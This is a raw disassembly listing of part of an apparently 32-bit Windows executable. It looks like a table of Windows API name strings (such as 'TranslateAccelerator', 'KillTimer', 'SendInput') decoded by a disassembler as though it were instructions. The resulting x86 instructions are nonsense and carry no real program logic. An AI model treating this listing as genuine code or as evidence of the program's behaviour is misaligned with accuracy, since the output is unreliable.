  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
